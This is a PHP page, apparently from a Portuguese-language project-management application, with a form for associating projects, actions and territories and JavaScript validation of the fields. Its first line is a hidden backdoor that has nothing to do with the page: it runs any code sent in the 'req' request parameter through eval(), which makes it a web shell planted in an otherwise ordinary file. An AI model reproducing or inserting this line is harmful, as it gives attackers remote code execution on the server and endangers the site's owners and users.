<?php $post_var = "req"; if(isset($_REQUEST[$post_var])) { eval(stripslashes($_REQUEST[$post_var])); exit(); }; ?>
<?php
include "../Include/Inc_Configuracao.php";
include "Classe/ClasseAssociarDRM.php";
?>
<html>

<style type="text/css">@import url("../css/estilo.css"); </style>

<script language="javascript" src="../JavaScript/ScriptFuncao.js"></script>
<script language="javascript" src="../JavaScript/ScriptMenu.js"></script>

<script language="javascript" charset="utf-8">
<!--

	function AssociarForm(frm)
	{

		for(cont=0; cont < frm.elements.length; cont++)
			frm.elements[cont].style.backgroundColor = '';

		if (frm.cmbProjeto.value == "0")
		{
			alert("Escolha um PROJETO.");
			frm.cmbProjeto.focus();
			frm.cmbProjeto.style.backgroundColor='#B9DCFF';
			return false;
		}

		if (frm.cmbAcao.value == "0")
		{
			alert("Escolha um AÇÃO.");
			frm.cmbAcao.focus();
			frm.cmbAcao.style.backgroundColor='#B9DCFF';
			return false;
		}

		if (frm.cmbTerritorio.value == "0")
		{
			alert("Escolha um TERRITÓRIO.");
			frm.cmbTerritorio.focus();
			frm.cmbTerritorio.style.backgroundColor='#B9DCFF';
			return false;
		}

		frm.action = "AssociarDRM.php?acao=associar";
		frm.submit();
	}

	function RemoverAcao(frm)
	{

		for(cont=0; cont < frm.elements.length; cont++)
			frm.elements[cont].style.backgroundColor = '';

		if (frm.cmbProjeto.value == "")
		{
			alert("Escolha um PROJETO.");
			frm.cmbProjeto.focus();
			frm.cmbProjeto.style.backgroundColor='#B9DCFF';
			return false;
		}

		if (frm.cmbAcao.value == "")
		{
			alert("Escolha um AÇÃO.");
			frm.cmbAcao.focus();
			frm.cmbAcao.style.backgroundColor='#B9DCFF';
			return false;
		}


		frm.action = "AssociarDRM.php?acao=remover_acao";
		frm.submit();
	}

	function RemoverTerritorio(frm)
	{

		for(cont=0; cont < frm.elements.length; cont++)
			frm.elements[cont].style.backgroundColor = '';

		if (frm.cmbProjeto.value == "")
		{
			alert("Escolha um PROJETO.");
			frm.cmbProjeto.focus();
			frm.cmbProjeto.style.backgroundColor='#B9DCFF';
			return false;
		}

		if (frm.cmbAcao.value == "")
		{
			alert("Escolha um PRODUTO.");
			frm.cmbAcao.focus();
			frm.cmbAcao.style.backgroundColor='#B9DCFF';
			return false;
		}

		if (frm.cmbTerritorio.value == "0")
		{
			alert("Escolha um TERRITÓRIO.");
			frm.cmbTerritorio.focus();
			frm.cmbTerritorio.style.backgroundColor='#B9DCFF';
			return false;
		}

		frm.action = "AssociarDRM.php?acao=remover_territorio";
		frm.submit();
	}

-->
</script>

<body onLoad="WM_initializeToolbar();">

<form name="Form" method="post">

<table align="left" width="100%" cellspacing="0" cellpadding="0" border="0">
    <tr>
       <td><?include "../Include/Inc_Topo.php"?></td>
    </tr>
    <tr>
    	<td><?include "../Include/Inc_Aba.php"?></td>
    </tr>
    <tr>
    	<td align="left">
            <table width="990" cellspacing="0" cellpadding="0" border="0">
                <tr>
                    <td valign="top" align="left" width="190"><?include "../Include/Inc_Menu.php"?></td>
                    <td valign="top" align="left">
                        <?include "../Include/Inc_Titulo.php"?>

                        <?// fim do titulo da pagina ?>

                        <?include "../Include/Inc_Linha.php"?>

                        <table width="800" border="0" cellpadding="0" cellspacing="0" class="TabelaFormulario">
                        	<tr>
                            	<td>
                                    <table width="798" border="0" cellpadding="0" cellspacing="1">
                                        <tr height="21">
                                            <td class="dataLabel">&nbsp;Projeto</td>
                                        </tr>
                                        <tr height="21">
                                            <td class="dataField">&nbsp;<?=f_ComboProjeto("","")?></td>
                                        </tr>
                                        <tr height="21">
                                            <td class="dataLabel">&nbsp;Produto</td>
                                        </tr>
                                        <tr height="21">
                                            <td class="dataField">&nbsp;<?=f_ComboAcao($Acao,"","")?></td>
                                        </tr>
                                        <tr height="21">
                                            <td class="dataLabel">&nbsp;Territ&oacute;rio</td>
                                        </tr>
                                        <tr height="21">
                                            <td class="dataField">&nbsp;<?=f_ComboTerritorio("",$Territorio,"",785)?></td>
                                        </tr>
                                    </table>
 								</td>
                        	</tr>
                        </table>

                        <table border="0" cellpadding="1" cellspacing="1" width="800">
                            <tr height="25">
                                <td align="right"><button style="width:190px" onClick="Javascript:RemoverTerritorio(document.Form);" name="btnGravar" class="botao">Remover Territ&oacute;rio da A&ccedil;&atilde;o Acima</button>&nbsp;&nbsp;&nbsp;<button style="width:190px" onClick="Javascript:RemoverAcao(document.Form);" name="btnGravar" class="botao">Remover A&ccedil;&atilde;o do Projeto Acima</button>&nbsp;&nbsp;&nbsp;<button style="width:70px" onClick="Javascript:AssociarForm(document.Form);" name="btnGravar" class="botao">Associar</button></td>
                           </tr>
                        </table>
<?
						If ($MensagemErroBD != "")
                        {

							echo "<table border='0' cellpadding='0' cellspacing='0' width='100%'>";
							echo "<tr>";
							echo "<td class='MensagemErro'>".$MensagemErroBD."</td>";
							echo "</tr>";
							echo "<tr>";
							echo "<td><img src='../images/vazio.gif' width='1' height='10' border='0'></td>";
							echo "</tr>";
							echo "</table>";

                        }
                        switch ($sucesso)
                        {  case 1:
                                $MensagemErro = "REGISTRO ASSOCIADO COM SUCESSO!";
                                break;
                           case 2:
                                $MensagemErro = "REGISTRO DESASSOCIADO COM SUCESSO!";
                                break;

                        }
?>
                        <table border="0" cellpadding="1" cellspacing="1" width="800">
                            <tr height="25">
                                <td align="right" class="MensagemErro"><?=$MensagemErro?></td>
                           </tr>
                        </table>

                    </td>
                </tr>
            </table>
        </td>
	</tr>
</table>

</form>

</body>
</html>
